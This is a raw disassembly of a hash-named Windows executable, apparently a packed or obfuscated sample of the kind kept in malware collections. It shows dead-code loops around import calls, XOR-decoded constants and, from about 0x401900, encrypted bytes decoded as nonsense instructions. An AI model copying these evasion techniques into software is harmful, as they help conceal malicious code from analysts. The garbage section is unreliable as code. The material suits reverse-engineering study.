
ca850b43d6da03a5fe3593efbe33afa265ff0009505bd00479906296f74b34d6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x42f010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x42f010
  401020:	inc    eax
  401021:	mov    ds:0x42f010,eax
  401026:	cmp    DWORD PTR ds:0x42f010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x42f010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42f00c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x42b000
  40105d:	cmp    DWORD PTR ds:0x42f010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x42f010
  40106f:	inc    eax
  401070:	mov    ds:0x42f010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x431010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x431008,0x43001c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x433008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x433008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x433008,ecx
  4010af:	cmp    DWORD PTR ds:0x433008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x433008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x42b048
  4010d4:	cmp    DWORD PTR ds:0x433008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x433008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x433008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x431010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x432010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41deec
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x433014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x432008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x42f024
  40113b:	adc    ecx,DWORD PTR ds:0x431004
  401141:	mov    DWORD PTR ds:0x42f024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x43301c
  401150:	sub    DWORD PTR ds:0x42f00c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x431004,0x42f00c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x433008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x42f020,0x1b
  401184:	cmp    DWORD PTR ds:0x42f020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x42f020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x42b004
  4011a7:	mov    ecx,DWORD PTR ds:0x42f020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x42f020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42f01c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42f00c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x42f024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x432018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x430014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x431010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x42f020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x42f010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x431014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x430014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x42f014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x42f000,0x431018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x43301c,0x433008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x432004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x43200c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x430018,0x431004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x433018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x430014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x432018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x42f000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x432014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x42f020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x42f010,0x1f
  401313:	cmp    DWORD PTR ds:0x42f010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x42f010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x42467b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42b04c
  40134b:	mov    edx,DWORD PTR ds:0x42f010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x42f010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x432008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x42f008,0x431004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x430014,0x43101c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x433004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x43201c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x430010
  4013c9:	sbb    DWORD PTR ds:0x43000c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x430018
  4013da:	or     edx,DWORD PTR ds:0x42f00c
  4013e0:	mov    DWORD PTR ds:0x430018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x431008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x430010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x42f020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x432004
  401417:	sub    DWORD PTR ds:0x42f01c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x432004,0x1f
  40143c:	cmp    DWORD PTR ds:0x432004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x432004,0x29
  401450:	jne    0x401466
  401456:	push   0x4246f1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x42b008
  401466:	mov    ecx,DWORD PTR ds:0x432004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x432004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x433014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42f01c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x433018,0x42f020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x433010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x433010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x433010,edx
  4014c9:	cmp    DWORD PTR ds:0x433010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x42b014
  4014e1:	cmp    DWORD PTR ds:0x433010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x42f008,0x0
  401504:	mov    edx,DWORD PTR ds:0x42f008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x42f008,edx
  401511:	cmp    DWORD PTR ds:0x42f008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x424711
  401523:	push   0x42464b
  401528:	call   DWORD PTR ds:0x42b050
  40152e:	cmp    DWORD PTR ds:0x42f008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x433008,0x43300c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x43201c,0x0
  401559:	mov    edx,DWORD PTR ds:0x43201c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x43201c,edx
  401566:	cmp    DWORD PTR ds:0x43201c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x42b054
  401583:	cmp    DWORD PTR ds:0x43201c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x430010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x430010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x430010,edx
  4015b7:	cmp    DWORD PTR ds:0x430010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x42b018
  4015cd:	cmp    DWORD PTR ds:0x430010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x430000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x42f028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x42f024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x42f024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x42f024,edx
  40163b:	cmp    DWORD PTR ds:0x42f024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x42f024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42b01c
  40166b:	cmp    DWORD PTR ds:0x42f024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x42f024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x42f024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x431010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x43300c,0x431008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x42f028,0x431010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x430018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	xchg   edx,eax
  40190d:	mov    bh,0x45
  40190f:	popf   
  401910:	bound  esp,QWORD PTR [edx+0x62]
  401913:	bound  ebx,QWORD PTR [edx]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x401948
  401922:	jne    0x40199a
  401924:	inc    ecx
  401925:	jl     0x401999
  401927:	jb     0x40199a
  401929:	sub    bl,cl
  40192b:	sar    ch,0x4c
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	inc    di
  40193f:	push   ecx
  401940:	jg     0x401969
  401942:	ins    BYTE PTR es:[edi],dx
  401943:	mov    dh,0x7f
  401945:	mov    esp,0xff3023ba
  40194a:	jbe    0x40190c
  40194c:	loop   0x401999
  40194e:	jg     0x40196e
  401950:	icebp  
  401951:	and    eax,0x97f1a2d1
  401956:	or     ebx,esi
  401958:	xchg   ebx,eax
  401959:	xor    eax,0x92b345ef
  40195e:	fsub   st,st(7)
  401960:	jno    0x401923
  401962:	sbb    al,cl
  401964:	out    dx,al
  401965:	loop   0x40199d
  401967:	add    al,0x54
  401969:	adc    BYTE PTR [esi],dh
  40196b:	jae    0x4019e1
  40196d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40196e:	(bad)  
  40196f:	or     ebx,DWORD PTR [ebp+0x19]
  401972:	mov    dh,0xff
  401974:	cmc    
  401975:	push   ebp
  401976:	xor    ebp,DWORD PTR [eax+0x2a]
  401979:	aam    0x43
  40197b:	in     eax,0x2
  40197d:	loop   0x4019e3
  40197f:	mov    ebp,0x5f84c17b
  401984:	xchg   ebx,eax
  401985:	mov    ebp,0x2d9a0817
  40198a:	jmp    0x40192a
  40198c:	and    BYTE PTR [edx+0x6b],ch
  40198f:	adc    eax,edx
  401991:	xor    DWORD PTR [edx-0x6f],ecx
  401994:	sub    BYTE PTR [ebx],ch
  401996:	dec    eax
  401997:	sti    
  401998:	scas   eax,DWORD PTR es:[edi]
  401999:	xchg   edx,eax
  40199a:	xor    eax,0xd0a7ac95
  40199f:	xchg   esp,eax
  4019a0:	dec    ebp
  4019a1:	clc    
  4019a2:	pop    ecx
  4019a3:	dec    edx
  4019a4:	push   eax
  4019a5:	adc    BYTE PTR [esi],bh
  4019a7:	jmp    0x4019cf
  4019a9:	sbb    esi,DWORD PTR [ecx+0x2cb7d253]
  4019af:	fcomp  QWORD PTR [eax]
  4019b1:	inc    esi
  4019b2:	loope  0x4019fe
  4019b4:	inc    esi
  4019b5:	mov    ecx,0xe4bf74e5
  4019ba:	pop    edx
  4019bb:	sbb    BYTE PTR [edi-0x1a],dh
  4019be:	popa   
  4019bf:	or     eax,0xd809adfe
  4019c4:	mov    ah,0x8b
  4019c6:	fmul   st,st(6)
  4019c8:	enter  0x71b6,0x43
  4019cc:	stos   BYTE PTR es:[edi],al
  4019cd:	aad    0x49
  4019cf:	repz inc BYTE PTR [edx-0x16]
  4019d3:	aad    0x16
  4019d5:	add    cl,dl
  4019d7:	mov    ecx,0xcd0f66d6
  4019dc:	rol    eax,1
  4019de:	pop    edi
  4019df:	mov    ebp,0xde1b678e
  4019e4:	das    
  4019e5:	sbb    DWORD PTR [edi],esp
  4019e7:	mov    ds:0xc7d685e6,eax
  4019ec:	loopne 0x401989
  4019ee:	pop    ds
  4019ef:	jl     0x401a49
  4019f1:	popa   
  4019f2:	inc    eax
  4019f3:	mov    bl,BYTE PTR [eax+0x7a4f3a97]
  4019f9:	sti    
  4019fa:	pop    es
  4019fb:	xor    BYTE PTR [edi],ch
  4019fd:	je     0x401a08
  4019ff:	or     BYTE PTR [ecx-0x4e4b7f7d],ah
  401a05:	sti    
  401a06:	adc    DWORD PTR [ebp+0x59],esp
  401a09:	mov    ecx,0xcbe5bf6d
  401a0e:	(bad)  
  401a0f:	xor    eax,0xf050c633
  401a14:	rcr    BYTE PTR [eax+0x101abe9c],0x43
  401a1b:	mov    ebp,0x289da8ba
  401a20:	or     esp,ebp
  401a22:	daa    
  401a23:	mov    dl,0x92
  401a25:	or     esp,DWORD PTR [eax+esi*1]
  401a28:	add    al,0x63
  401a2a:	ja     0x401a85
  401a2c:	repnz mov ebp,0x36626491
  401a32:	je     0x401a01
  401a34:	arpl   WORD PTR [ecx+ecx*4+0x74],bx
  401a38:	mov    dl,0xf0
  401a3a:	jge    0x4019ce
  401a3c:	mov    ebp,0xc067b050
  401a41:	push   esp
  401a42:	mov    cl,0xb9
  401a44:	pop    ds
  401a45:	xor    esp,0xffffff9f
  401a48:	push   edi
  401a49:	adc    cl,BYTE PTR [ebx+ebp*2]
  401a4c:	add    bh,al
  401a4e:	mov    al,ds:0x92d5a6b0
  401a53:	(bad)  
  401a54:	push   ds
  401a55:	(bad)  
  401a56:	cmc    
  401a57:	fimul  DWORD PTR [edx+0x62ba22e9]
  401a5d:	aaa    
  401a5e:	cmp    BYTE PTR [edx-0x628323a2],cl
  401a64:	call   0x84ea:0x127e8a88
  401a6b:	sub    BYTE PTR [esi+0x3955d8c0],0x86
  401a72:	sub    dl,BYTE PTR [edx]
  401a74:	sub    al,0x71
  401a76:	popa   
  401a77:	outs   dx,BYTE PTR ds:[esi]
  401a78:	sbb    ebp,ecx
  401a7a:	xchg   ecx,eax
  401a7b:	shl    DWORD PTR [ecx+0x44],0x74
  401a7f:	sbb    esp,DWORD PTR [edi]
  401a81:	inc    BYTE PTR [esi-0x3c]
  401a84:	int3   
  401a85:	inc    esi
  401a86:	mov    esi,0xe5669210
  401a8b:	das    
  401a8c:	or     BYTE PTR [ecx+0x44],cl
  401a8f:	dec    ebx
